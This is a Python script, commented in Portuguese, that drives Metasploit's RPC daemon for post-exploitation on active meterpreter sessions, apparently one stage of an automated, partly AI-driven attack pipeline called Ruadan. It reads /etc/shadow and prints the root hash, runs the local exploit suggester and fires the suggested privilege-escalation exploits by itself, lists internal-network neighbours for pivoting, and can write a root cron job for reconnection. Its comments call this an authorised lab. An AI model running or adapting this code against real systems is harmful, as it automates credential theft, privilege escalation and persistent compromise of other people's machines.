#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================================================
# Ruadan — ETAPA 3: Pós-exploit ofensivo REAL com a session (via msfrpcd)
# ==============================================================================
# Uso: msf_post_session.py <output_folder> <host> --action=<creds|privesc|pivot|persist|all>
#
# Ações sobre a(s) session(s) meterpreter ATIVA(S) (abertas na Etapa 2, persistentes
# no msfrpcd durante toda a campanha):
#
#   creds   — Coleta REAL de credenciais: /etc/shadow (Linux) ou hashdump (Windows)
#             → MSF_CREDS_COLLECTED (evidence credential na kill chain)
#   privesc — Local_exploit_suggester COMPLETO contra o kernel/sistema REAL;
#             extrai as sugestões verificadas ("The target is vulnerable") e
#             DISPARA as top via RPC na session → se nova session root:
#             MSF_ROOT_OBTAINED (EXPLOITED_ROOT com evidência real!)
#   pivot   — ifconfig + arp_table da session → vizinhos reais da rede interna
#             → MSF_PIVOT_NEIGHBOR (insumo para LATERAL_MOVE da IA)
#   persist — GATE DUPLO (env MSF_ALLOW_PERSIST=1 + --action=persist): modo
#             seguro por padrão — detecta permissão de persistência e reporta
#             MSF_PERSIST_READY sem instalar nada. Com o gate liberado, instala
#             reconexão via cron (lab próprio e autorizado).
#
# Todas as linhas MSF_* são parseáveis pelos findings do Ruadan (config.ini).
# ==============================================================================
from __future__ import annotations

import os
import re
import sys
import time

sys.path.insert(0, "/ruadan")  # PYTHONPATH container: importa o cliente Etapa 2
try:
    from msf_exploit_phase import MsfRpcClient, rpcd_alive
except ImportError:
    print("[msf-post][FATAL] msf_exploit_phase.py não encontrado ao lado deste script.")
    sys.exit(0)


def emit(line: str):
    print(line, flush=True)


def get_sessions(rpc) -> dict:
    return {sid: info for sid, info in (rpc.sessions() or {}).items()
            if "meterpreter" in str(info.get("type", "")).lower()}


def _extract_lines(text: str, pattern: str, limit: int = 10) -> list:
    return [ln.strip() for ln in text.splitlines() if re.search(pattern, ln)][:limit]


def do_creds(rpc, sid: str):
    """Coleta REAL de credenciais pela session (Linux: /etc/shadow)."""
    getuid = rpc.mtr_run(sid, "getuid", wait=4)
    emit(f"MSF_GETUID: sid={sid} | {(getuid or '?').splitlines()[0] if getuid else '?'}")
    shadow = rpc.mtr_run(sid, "cat /etc/shadow", wait=6)
    if shadow and "root:" in shadow and "$" in shadow:
        root_hash = next((ln for ln in shadow.splitlines() if ln.startswith("root:")), "")
        emit(f"MSF_CREDS_COLLECTED: sid={sid} | /etc/shadow LIDO ({len(shadow)}B) root:{root_hash[:40]}...")
        return True
    emit(f"MSF_CREDS_COLLECTED: sid={sid} | /etc/shadow não legível (uid sem permissão) — honesto.")
    return False


def do_privesc(rpc, sid: str, max_exploits: int = 2):
    """Suggester completo + DISPARO dos exploits sugeridos na session."""
    info = rpc.sessions().get(sid, {})
    peer = info.get("tunnel_peer", "?")
    emit(f"MSF_PRIVESC_SUGGESTION: sid={sid} | Executando local_exploit_suggester completo (pode levar minutos)...")
    sugg = rpc.mtr_run(sid, "run post/multi/recon/local_exploit_suggester", wait=300)
    if not sugg:
        emit("MSF_PRIVESC_SUGGESTION: sid={sid} | suggester sem saída.")
        return False
    # Sugestões REAIS: "[+] <ip> - <module> — The target is vulnerable."
    vulns = _extract_lines(sugg, r"The target is vulnerable|is vulnerable", limit=8)
    for v in vulns:
        emit(f"MSF_PRIVESC_SUGGESTION: sid={sid} | {v[:180]}")
    if not vulns:
        emit(f"MSF_PRIVESC_SUGGESTION: sid={sid} | nenhuma vulnerabilidade local verificada (host patcheado — honesto).")
        return False

    # DISPARA os top exploits sugeridos (module.execute com SESSION=sid)
    for line in vulns[:max_exploits]:
        m = re.search(r"(exploit/[a-zA-Z0-9/_\-]+)", line)
        if not m:
            continue
        mod = m.group(1)
        emit(f"MSF_PRIVESC_SUGGESTION: sid={sid} | DISPARANDO {mod} na session...")
        try:
            rpc.run_module("exploit", mod, {"SESSION": sid})
        except Exception as e:
            emit(f"MSF_PRIVESC_SUGGESTION: sid={sid} | falha ao disparar {mod}: {e}")
            continue
        # aguarda nova session e verifica getuid
        time.sleep(45)
        now = rpc.sessions() or {}
        if len(now) > 1:
            for nsid, ninfo in now.items():
                if nsid == sid:
                    continue
                uid = rpc.mtr_run(nsid, "getuid", wait=5)
                emit(f"MSF_SESSION_OPENED: sid={nsid} via={mod} (pós-privesc) peer={ninfo.get('tunnel_peer','?')}")
                if uid and "root" in uid.lower():
                    emit(f"MSF_ROOT_OBTAINED: sid={nsid} | {uid.strip()} — PRIVESC REAL EXECUTADO COM SUCESSO")
                    return True
    return False


def do_pivot(rpc, sid: str):
    """Vizinhos REAIS da rede interna vistos do host comprometido."""
    out = rpc.mtr_run(sid, "arp", wait=6)
    neigh = []
    for ln in (out or "").splitlines():
        m = re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-f:]{17})", ln.strip())
        if m and not m.group(1).endswith(".255") and m.group(1) != "127.0.0.1":
            neigh.append((m.group(1), m.group(2)))
    for ip, mac in neigh[:12]:
        emit(f"MSF_PIVOT_NEIGHBOR: sid={sid} | {ip} ({mac})")
    if not neigh:
        emit(f"MSF_PIVOT_NEIGHBOR: sid={sid} | nenhum vizinho via arp (session local ao host).")
    return bool(neigh)


def do_persist(rpc, sid: str):
    """Persistência — GATE DUPLO. Modo seguro: só detecta permissão."""
    allowed = os.environ.get("MSF_ALLOW_PERSIST", "0") == "1"
    probe = rpc.mtr_run(sid, "test -w /etc/cron.d && echo CRON_WRITABLE", wait=4)
    writable = "CRON_WRITABLE" in probe
    if not allowed:
        emit(f"MSF_PERSIST_READY: sid={sid} | /etc/cron.d gravável={writable} — instalação NÃO executada "
             f"(gate: MSF_ALLOW_PERSIST=1 libera a instalação da reconexão)")
        return writable
    if not writable:
        emit(f"MSF_PERSIST_READY: sid={sid} | /etc/cron.d não gravável — persistência por cron impossível.")
        return False
    # Lab próprio autorizado: cron de reconexão marcado como artefato do Ruadan
    install = rpc.mtr_run(
        sid,
        'echo "*/30 * * * * root /tmp/ruadan_reconnect 2>/dev/null" > /etc/cron.d/ruadan-persist-test',
        wait=5)
    emit(f"MSF_PERSIST_READY: sid={sid} | cron de reconexão instalado (ruadan-persist-test) — saída: {install[:80]!r}")
    return True


def main() -> int:
    if len(sys.argv) < 4:
        print(__doc__)
        return 1
    out_dir, host_arg = sys.argv[1], sys.argv[2]
    action = "all"
    for a in sys.argv[3:]:
        if a.startswith("--action="):
            action = a.split("=", 1)[1]

    if not rpcd_alive():
        emit("[msf-post] msfrpcd inativo — sem sessions (rodar a fase de exploração primeiro).")
        return 0
    rpc = MsfRpcClient()
    sessions = get_sessions(rpc)
    if not sessions:
        emit("[msf-post] nenhuma session meterpreter ativa — pós-exploit sem o que fazer (honesto).")
        return 0
    print(f"[msf-post] === ETAPA 3 — {len(sessions)} session(s) ativa(s) — action={action} ===")

    for sid in sessions:
        if action in ("creds", "all"):
            do_creds(rpc, sid)
        if action in ("privesc", "all"):
            do_privesc(rpc, sid)
        if action in ("pivot", "all"):
            do_pivot(rpc, sid)
        if action in ("persist", "all"):
            do_persist(rpc, sid)
    return 0


if __name__ == "__main__":
    sys.exit(main())
